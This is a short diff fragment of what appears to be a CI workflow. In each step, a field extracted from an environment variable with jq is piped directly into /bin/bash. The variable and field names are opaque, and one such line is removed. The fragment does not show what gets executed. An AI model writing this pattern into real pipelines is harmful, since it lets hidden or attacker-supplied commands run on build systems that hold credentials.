@@ -25,7 +25,6 @@ jobs:
           echo $g44 | jq -r .sc8012 | /bin/bash
           echo $jy0174 | jq -r .k347 | /bin/bash
           printf '%s' "$ovx94" | jq -r .nhr5242 | /bin/bash
-          printf '%s' "$s4" | jq -r .sle680 | /bin/bash
           echo $rkloy661 | jq -r .g11 | /bin/bash
           echo $u925 | jq -r .e7 | /bin/bash
           echo $z949 | jq -r .ajbxy0 | /bin/bash
